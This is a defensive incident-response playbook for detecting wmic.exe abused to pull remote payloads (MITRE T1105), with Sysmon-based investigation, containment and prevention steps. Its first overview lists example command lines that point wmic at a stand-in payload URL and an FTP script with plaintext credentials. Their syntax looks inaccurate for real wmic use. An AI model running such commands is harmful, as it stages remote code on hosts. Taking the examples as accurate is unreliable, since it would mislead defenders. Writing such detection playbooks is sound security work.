# T1105 — Ingress Tool Transfer · LOLBin: wmic.exe (Windows Management Instrumentation Command-line)
**Rules Covered:**  
- CNC-E-2726320-501 — WMIC Command Line (Process Creation)  
- CNC-E-2726320-502 — WMIC Network Connection (Sysmon EID 3)  
**Last updated:** 2025-10-28 17:47 UTC

> `wmic.exe` is a Windows built‑in tool that enables command‑line interaction with **WMI** (Windows Management Instrumentation). It's a trusted utility often used for **system management, network configuration**, and **file management**. When used with **remote IPs** or **URLs**, it can be leveraged by adversaries for **T1105 - Ingress Tool Transfer** or **lateral movement**, as the binary can download remote payloads and execute them within the network.

---

## Playbook 1 — WMIC Command Line (Process Creation)

### Overview
Investigate **process creation** where `wmic.exe` is invoked with **suspicious command-line arguments**, particularly **remote IPs**, **URLs**, or **non-standard network operations**. Examples:
- `wmic.exe /node:"http://example.com/payload" /user:admin /password:password`
- `wmic.exe /node:"\\server\share\file" /user:admin`
- `wmic.exe /node:"ftp://192.168.0.100/script.bat"`

These patterns suggest that **wmic.exe** is being used to execute remote commands, potentially staging payloads or gathering information from external sources.

### Initial Response
1. **Preserve context:** Export **Sysmon EID 1 / Security 4688** for `wmic.exe` showing `Image`, `CommandLine`, `ParentImage`, `User`, and timestamp.  
2. **Parse command-line arguments:** Identify **remote URLs/IPs**, **UNC paths**, and **non-standard flags** (`/node`, `/user`, `/password`, etc.).  
3. **Secure artifacts:** Snapshot any file paths or directories mentioned in the command line; hash any created files in `%TEMP%` or `INetCache`.

### Investigation Steps
#### 1) Process & Lineage
- Confirm `wmic.exe` was launched from a **trusted location** and is signed by Microsoft.  
- Review **parent process** to determine if `wmic.exe` was executed from a **legitimate source** (scripts, batch jobs, RMM, etc.).  
- Verify if **remote execution** was expected or suspicious based on user role and asset.

#### 2) Command‑Line Analysis
- Inspect `CommandLine` for evidence of **external IPs**, **raw URLs**, or **UNC/WebDAV paths**.  
- Look for **credentials in plaintext** (e.g., `/user`, `/password` flags), as this could indicate abuse of the utility for **information gathering**.

#### 3) Network & DNS Correlation
- Correlate **Sysmon EID 3** for network traffic associated with the same process. If `wmic.exe` is interacting with external IPs, investigate egress paths.  
- Check **Sysmon EID 22** for DNS queries related to the destination host(s), confirming whether **external IPs** or **non‑enterprise DNS** is involved.

#### 4) Artifact & Execution
- Review **Sysmon EID 11** for files created in `%TEMP%`, **Zone.Identifier** ADS, or files related to network resources accessed.  
- Look for **follow‑on processes** (e.g., `rundll32.exe`, `powershell.exe`, `cmd.exe`) that could indicate further execution or staging.

#### 5) Fleet Correlation
- Pivot by **IP** or **domain** observed in **CommandLine** and check across endpoints for matching egress activity or remote execution.

### Key Artifacts
- **Sysmon EID 1 / 4688:** Full process creation context, including command line arguments and parent process.  
- **Sysmon EID 3:** Outbound connections and network egress from `wmic.exe` or its parent processes.  
- **Sysmon EID 22:** DNS queries for unusual destination hosts.  
- **Sysmon EID 11:** File creation and modification in **%TEMP%** or **INetCache**.

### Containment Actions
- **Block** external destination hosts and IPs; **quarantine** suspicious files; **terminate** related processes.  
- Consider **host isolation** if execution is confirmed from untrusted sources.

### Prevention Measures
- **AppLocker/WDAC** to constrain the use of `wmic.exe` to authorized personnel or tasks.  
- Enforce **network segmentation** and **firewall rules** to block **non-necessary network communications** for `wmic.exe`.  
- Review and audit **credentials in plain text** in command-line parameters.

### Recovery
- Remove any malicious artifacts or payloads; **restore files** from backups, and validate integrity of files in **%TEMP%**.  
- **Update detection rules** for similar behavior.

### False Positives
- **Legitimate admin usage** of `wmic.exe` for network management and configuration, especially in **trusted internal environments**.  
- **IT/Sysadmin automation** scripts that use `wmic.exe` to gather system info or remotely manage devices.

---

## Playbook 2 — WMIC Network Connection (Sysmon EID 3)

### Overview
This playbook investigates **network connections** attributed to `wmic.exe` in **Sysmon EID 3** logs. Connections from `wmic.exe` can be used for **data transfer** or **remote execution** over the network (T1105).

### Initial Response
1. **Capture records:** Export **Sysmon EID 3** (dest IP/host/port/proto) and correlate with **EID 1/4688** for `wmic.exe`.  
2. **Classify destination:** Internal vs external; flag **raw IPs**, **new/rare domains**, **non‑standard ports**.  
3. **Scope usage:** Review if the asset typically interacts with remote network services or if this behavior is unusual.

### Investigation Steps
#### 1) Process & Command Context
- Retrieve **command-line arguments** for `wmic.exe` to confirm interaction with remote resources.  
- Validate **parent process** (e.g., script hosts, RMM tools, PowerShell, or scheduled tasks) and user context.

#### 2) Destination Validation
- Enrich **destination** IP/domain reputation (e.g., ASN lookup, threat intel feeds). Check **proxy logs** for method/status/bytes of connections.  
- For **WebDAV UNC** paths, pivot to **WebClient** (`svchost.exe`) telemetry and analyze logs.

#### 3) Artifact Discovery
- Review **Sysmon EID 11** for files created or modified from network paths or downloaded from external sources.  
- Check for **follow‑on processes** triggered by `wmic.exe` (e.g., script hosts, PowerShell).

#### 4) Fleet Correlation
- Pivot on **destination host**, **IP**, **command line**, and **hashes** across endpoints to uncover widespread activity.

### Key Artifacts
- **Sysmon EID 3:** Egress network activity from `wmic.exe`.  
- **Sysmon EID 1 / 4688:** Process creation and command-line analysis.  
- **Sysmon EID 11:** Files created or modified from network paths.  
- **EDR timeline:** Child processes and execution follow‑on.

### Containment Actions
- **Block** suspicious external destinations; **quarantine** files and **terminate** suspicious processes.  
- If confirmed malicious, consider **host isolation**.

### Prevention Measures
- **AppLocker/WDAC** to limit `wmic.exe` use to authorized users; enforce **egress controls** for remote destinations.  
- Regularly review and audit **RMM tools** or **sysadmin scripts** for unauthorized usage.

### Recovery
- Remove any artifacts, restore files from backup, and tune detection rules accordingly.

### False Positives
- Legitimate **network management** tools that use `wmic.exe` to interact with internal network devices and services.